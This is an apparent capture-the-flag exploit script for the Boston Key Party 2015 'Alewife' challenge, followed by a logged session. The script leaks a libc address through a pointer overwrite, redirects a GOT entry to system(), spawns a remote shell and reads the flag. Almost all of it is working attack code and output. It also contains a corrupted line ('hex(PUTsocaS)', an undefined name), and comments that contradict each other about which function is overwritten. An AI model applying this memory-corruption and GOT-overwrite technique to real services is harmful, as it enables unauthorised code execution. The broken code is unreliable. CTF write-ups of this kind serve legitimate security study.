#!/usr/bin/env python2
# --------------------------------------------------------------------------------------------------
# Boston Key Party 2015 - Alewife (Pwn 400)
# --------------------------------------------------------------------------------------------------
import socket
import struct
import telnetlib

# --------------------------------------------------------------------------------------------------
def recv_until(st):                 # receive until you encounter a string
  ret = ""
  while st not in ret:
    ret += s.recv(8192)
  return ret
# --------------------------------------------------------------------------------------------------
def send( n ):                      # send a number
    s.send( str(n) + '\n' )
    s.recv(512)
# --------------------------------------------------------------------------------------------------
def sendmany( nl ):                 # send many numbers
    for n in nl:
        s.send( str(n) + '\n' )
        s.recv(512)
# --------------------------------------------------------------------------------------------------
if __name__ == "__main__":

    s = socket.create_connection(("alewife.bostonkey.party", 8888))
#   s = socket.create_connection(("localhost", 9999))

    f = s.makefile()                # return a file object associated with the socket

    recv_until('Array Ops\n:')
    print ' **** PHASE 1: Leak an address **** '
    
    sendmany([1, 5, 0, 2])          # create a new object in S1[0]
    sendmany([2, 2, 0, 1, 256])     # write 256 integers on it

    for i in range(0, 256):
        send( 0x6831c8+8*i-0x10)    # values must be greater than original ptr
    
    # greatest value is: 0x6831c8+8*255 - 0x10 = 0x6839b0
    # ptr has value: 0x6831c8. 
    # so we'll overwrite ptr with 0x6839b0

    sendmany([2, 2, 0, 3])          # sort values and overwrite ptr

    # we have to pop values, othewise N will be 256 and we won't be able to insert any values
    for i in range(0, 256-1):       
        sendmany([2, 2, 0, 4])      # pop all numbers => N = 0
    
    sendmany([2, 2, 0, 1, 3])       # insert 3 numbers in S1[0]

    send( 0x42424242 )              # garbage, write on 0x6839b0
    send( 0x42424242 )              # garbage, write on 0x6839b8
    send( 0x602db0+8 )              # address of puts in GOT (on 0x6839c0)

    # why we did this? Because we can overwrite ptr with a higher value only. However
    # got entries are in lower addresses. So we just "shift" the array, and then we 
    # pop some values to increase the size and being able to overwrite ptr with any
    # value we want.

    sendmany([2, 4])                # print object data
    s.send('0\n')                   # send without receiving

    # The response will be like this:
    # [
    #    140663751842240,           --> that's the address of puts
    #    140663752348656,
    #    4196150,
    # ...
    f.read(5)                       # skip "[\n   " (5 chars)

    x = f.read(1)
    while x[len(x)-1] != ',':       # read the 1st number
        x = x + f.read(1)
    x = x[0:len(x)-1]               # remove the ','

    PUTS = int(x)                   # get the address of puts()
    print 'Leaking address of puts:', hex(PUTsocaS) 

    # Ok we can't make any changes with S1[0], because ptr is already pointing to GOT
    # No problem, just use S1[1] :)
    # do the same again, with S1[1] 
    print ' **** PHASE 2: exploit! ****'

    sendmany([1, 5, 1, 2])          # call newobj(1, 2)
    sendmany([2, 2, 1, 1, 256])     # insert 256 numbers in S1[1]

    for i in range(0, 256):         # write values 
        send( 0x6831c8+8*i-0x10+0x828)

    sendmany([2, 2, 1, 3])          # sort values and overwrite ptr

    for i in range(0, 256-1):       # pop all numbers => N = 0
        sendmany([2, 2, 1, 4])

    sendmany([2, 2, 1, 1, 3])       # insert 3 numbers in S1[1]

    send( 0x42424242 )              # garbage
    send( 0x42424242 )              # garbage
    send( 0x602E20+0 )              # address of strtoul() in GOT

    sendmany([2, 2, 1, 4])          # pop some values to adjust ptr inside GOT
    sendmany([2, 2, 1, 4])
    sendmany([2, 2, 1, 4])
    sendmany([2, 2, 1, 4])

    sendmany([2, 2, 1, 1, 2])       # write 2 values    

    # addresses in my libc:
    #   .text:0000000000046640  system 
    #   .text:00000000000709C0  puts 
    #
    # addresses in remote libc:
    #   .text:0000000000046640  system 
    #   .text:000000000006FE30  puts 
    #
    SYSTEM = PUTS - 0x6FE30 + 0x46640

    print 'Caclulating address of system:', hex(SYSTEM)

    send( SYSTEM )                  # overwrite address atoi() with system()
    send('/bin/sh')                 # send the magic string

    print ' **** PHASE 3: opening shell ****'
    t = telnetlib.Telnet()          # open shell
    t.sock = s
    t.interact()

    exit(0)
# --------------------------------------------------------------------------------------------------
'''
ispo@nogirl ~/bkp $ python central_square.py 
 **** PHASE 1: Leak an address **** 
Leaking address of puts: 0x7fc08f7e99c0
 **** PHASE 2: exploit! ****
Caclulating address of system: 0x7fc08f7bf640
 *** Opening Shell *** 
ls -l
    total 84
    drwxr-xr-x   2 root root  4096 Feb 27 18:43 bin
    drwxr-xr-x   3 root root  4096 Feb 27 18:44 boot
    drwxr-xr-x  13 root root  4000 Feb 27 18:44 dev
    drwxr-xr-x  90 root root  4096 Feb 27 18:44 etc
    drwxr-xr-x   4 root root  4096 Feb 27 18:25 home
    lrwxrwxrwx   1 root root    33 Feb 27 18:43 initrd.img -> boot/initrd.img-3.13.0-46-generic
    lrwxrwxrwx   1 root root    33 Jan 23 00:41 initrd.img.old -> boot/initrd.img-3.13.0-44-generic
    drwxr-xr-x  21 root root  4096 Jan 23 00:40 lib
    drwxr-xr-x   2 root root  4096 Feb 27 18:43 lib64
    drwx------   2 root root 16384 Jan 23 00:42 lost+found
    drwxr-xr-x   2 root root  4096 Jan 23 00:39 media
    drwxr-xr-x   3 root root  4096 Jan 30 23:39 mnt
    drwxr-xr-x   2 root root  4096 Jan 23 00:39 opt
    dr-xr-xr-x 189 root root     0 Feb 27 18:16 proc
    drwx------   3 root root  4096 Feb 27 18:49 root
    drwxr-xr-x  19 root root   740 Feb 28 07:37 run
    drwxr-xr-x   2 root root 12288 Feb 27 18:43 sbin
    drwxr-xr-x   2 root root  4096 Jan 23 00:39 srv
    dr-xr-xr-x  13 root root     0 Feb 27 18:16 sys
    drwx-wx-wt   2 root root  4096 Mar  1 14:17 tmp
    drwxr-xr-x  10 root root  4096 Jan 23 00:39 usr
    drwxr-xr-x  12 root root  4096 Jan 23 00:42 var
    lrwxrwxrwx   1 root root    30 Feb 27 18:43 vmlinuz -> boot/vmlinuz-3.13.0-46-generic
    lrwxrwxrwx   1 root root    30 Jan 23 00:41 vmlinuz.old -> boot/vmlinuz-3.13.0-44-generic
cd /home
ls
    array
    ubuntu
cd array
ls
    array
    flag
cat flag
    Because_C++_is_t00_hard!!!

'''
# --------------------------------------------------------------------------------------------------

